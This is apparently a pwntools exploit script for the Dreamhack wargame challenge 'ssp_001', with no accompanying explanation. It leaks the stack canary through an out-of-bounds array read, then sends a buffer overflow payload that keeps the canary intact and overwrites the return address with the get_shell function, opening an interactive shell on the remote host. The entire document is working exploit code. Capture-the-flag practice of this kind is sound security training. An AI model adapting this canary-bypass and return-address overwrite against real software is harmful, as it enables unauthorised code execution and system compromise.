from pwn import *
def slog(n,m) :
	return success(" : ".join([n,hex(m)]))
e=ELF("./ssp_001")
r=remote("host3.dreamhack.games", 9069)

get_shell = e.symbols['get_shell']
canary=b""
i=128
while i <= 131:
	r.recvuntil(b"> ")
	r.send(b'P')
	r.sendlineafter(b"Element index : ",str(i))
	r.recvuntil(b"is : ") 
	canary +=r.recvn(2)
	i=i+1
canary = int(canary,16)
canary = canary.to_bytes(4,'big')


r.sendlineafter(b"> ", 'E')
r.sendlineafter(b"Size : ",str(1000))
payload=b"A"*64 + canary + b"B"*8 +p32(get_shell)

r.sendlineafter(b"Name : ",payload)
r.interactive()
